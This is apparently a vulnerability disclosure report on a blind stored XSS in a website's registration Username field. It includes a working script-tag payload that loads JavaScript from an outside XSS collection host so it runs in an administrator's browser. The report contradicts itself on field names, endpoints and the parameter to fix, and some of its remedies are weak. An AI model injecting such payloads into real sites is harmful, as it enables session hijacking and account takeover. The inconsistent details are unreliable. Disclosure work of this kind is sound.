## Title

 Blind Cross-Site Scripting (XSS) via Register Page Name Field 


## Vulnerability Type

Stored XSS

## Summary : 
The "Username" input field in the Register New Account  section does not sanitize or encode user-supplied input before storing it in the database and later rendering it back to users. This means any JavaScript payload entered as a report name gets saved and then executed in the browser of every authenticated user who visits the Reports page — not just the attacker.

## Vulnerable Endpoint
http://kzlabs.com/63.php


## Steps to Reproduce : 

1. Register for New Account at `https://kzlabs.com/64.php`.
4. In the Username field  enter the following payload: `'"><script src=https://xss.report/c/xamoo></script>` ( Note payload is taken from website : https://xss.report/ . Notes create account here and take any payload from XSS Payload Section . then add it here implace of my payload because xss result will appear in XSS report section in this website)
5. Fill in the remaining required fields (Email, Password, etc.) and Create a New Account.
6. Once the Account is Created, When a admin View thee page where the payload is stored / Account data is store . 
7. Check https://xss.report/ website , check Xss report section You will get every detail.
   

## Payload Used

```'"><script src=https://xss.report/c/xamoo></script>```

## Proof of Concept Request
  Video is created how to run the payload 
  

https://github.com/user-attachments/assets/0d356cef-a565-4aa1-82d4-e1ce4eb9850a






 



## Impact
 
 An attacker can perform the following actions using this vulnerability:
 
 - Full account takeover without user interaction — hijack session, reset password, or link attacker’s OAuth

  
## Recommendations for fix:

 Validate and sanitize the redirectUrl parameter to ensure that it does not contain any malicious content. This can be done by:

1. Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
2. Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
4. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
5. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
